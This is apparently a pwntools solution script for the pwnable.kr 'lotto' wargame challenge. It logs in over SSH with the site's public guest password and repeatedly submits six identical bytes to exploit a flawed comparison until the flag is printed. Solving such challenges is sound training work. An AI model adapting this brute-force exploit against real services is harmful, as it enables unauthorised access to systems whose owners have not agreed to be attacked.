from pwn import *

# Connect to the server
sh = ssh('lotto', 'pwnable.kr', password='guest', port=2222)
p = sh.process('./lotto')

# Exploit the flawed comparison logic
for i in range(1000):  # Try up to 1000 times
    # Skip menu prompts
    p.recvlines(3)

    # Select "Play Lotto"
    p.sendline('1')
    p.recvline()  # Skip "Submit your 6 lotto bytes" prompt

    # Submit 6 identical bytes (e.g., '------')
    p.sendline('------')

    # Check the result
    result = p.recvline().decode()
    if 'bad' not in result:
        print('Found the flag!')
        print(p.recv().decode())  # Print the flag
        break

# Close the connection
sh.close()